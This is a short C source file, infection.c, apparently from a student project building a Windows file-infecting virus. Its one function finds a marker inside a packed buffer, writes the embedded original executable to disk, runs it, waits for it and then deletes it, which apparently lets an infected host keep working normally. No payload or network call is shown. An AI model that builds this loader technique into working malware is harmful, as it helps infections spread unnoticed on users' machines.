/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

bool		run_packed_executable(char *executable_path, char *packed_executable_content, int packed_executable_size, char **argv, char **env)
{
	int pattern_position = -1;

	if ((pattern_position = find_pattern(packed_executable_content, packed_executable_size)) == -1) {
		return (false);
	}
	/*
	** Get packed executable and write this on executable_path
	*/
	char	*executable_content	= packed_executable_content + pattern_position;
	int		executable_size		= packed_executable_size - pattern_position;
	windows_file_create_contents_size(executable_path, executable_content, executable_size);

	/*
	** Execve executable_path with argv, env
	** _P_WAIT wait process //_P_DETACH
	*/
	//int     nPid, termstat;
	printf("execve : |%s|\n", executable_path);
	_spawnvpe(_P_WAIT, executable_path, (const char **)argv, (const char **)env);

	//printf("Start wait\n");
	//_cwait(&termstat, nPid, _WAIT_CHILD);
	printf("process_finished go remove\n");
	/*
	** Remove executable
	*/
	remove(executable_path);
	return (true);
}
